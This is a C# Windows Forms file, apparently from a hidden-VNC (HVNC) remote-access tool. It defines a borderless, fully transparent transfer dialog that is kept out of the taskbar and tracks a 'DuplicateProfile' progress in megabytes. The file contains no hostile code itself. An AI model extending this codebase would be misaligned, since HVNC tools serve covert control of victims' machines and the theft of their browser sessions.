using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
    public class FrmTransfer : Form
    {
        private IContainer components;
        public int int_0;

        public FrmTransfer()
        {
            int_0 = 0;
            InitializeComponent();
        }

        public ProgressBar DuplicateProgesse { get; set; }

        public Label FileTransferLabele { get; set; }

        public Label PingTransfor { get; set; }

        private void FrmTransfer_Load(object sender, EventArgs e)
        {
        }

        public void DuplicateProfile(int int_1)
        {
            if (int_1 > int_0)
                int_1 = int_0;
            FileTransferLabele.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(int_0) + " MB";
            DuplicateProgesse.Value = int_1;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
                components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            var resources = new ComponentResourceManager(typeof(FrmTransfer));
            DuplicateProgesse = new ProgressBar();
            FileTransferLabele = new Label();
            PingTransfor = new Label();
            SuspendLayout();
            // 
            // DuplicateProgess
            // 
            DuplicateProgesse.Location = new Point(12, 12);
            DuplicateProgesse.Name = "DuplicateProgesse";
            DuplicateProgesse.Size = new Size(453, 23);
            DuplicateProgesse.TabIndex = 1;
            // 
            // FileTransferLabel
            // 
            FileTransferLabele.AutoSize = true;
            FileTransferLabele.Location = new Point(225, 44);
            FileTransferLabele.Name = "FileTransferLabele";
            FileTransferLabele.Size = new Size(37, 13);
            FileTransferLabele.TabIndex = 4;
            FileTransferLabele.Text = "Status";
            // 
            // PingTransform
            // 
            PingTransfor.AutoSize = true;
            PingTransfor.Location = new Point(255, 44);
            PingTransfor.Name = "PingTransfor";
            PingTransfor.Size = new Size(95, 13);
            PingTransfor.TabIndex = 5;
            PingTransfor.Text = "Ping: Measuring....";
            PingTransfor.Visible = false;
            // 
            // FrmTransfer
            // 
            AutoScaleDimensions = new SizeF(6F, 13F);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.FromArgb(25, 27, 38);
            ClientSize = new Size(475, 66);
            Controls.Add(FileTransferLabele);
            Controls.Add(DuplicateProgesse);
            Controls.Add(PingTransfor);
            DoubleBuffered = true;
            ForeColor = Color.White;
            FormBorderStyle = FormBorderStyle.None;
            Icon = (Icon) resources.GetObject("$this.Icon");
            Name = "FrmTransfer";
            Opacity = 0D;
            ShowIcon = false;
            ShowInTaskbar = false;
            StartPosition = FormStartPosition.CenterScreen;
            Load += FrmTransfer_Load;
            ResumeLayout(false);
            PerformLayout();
        }
    }
}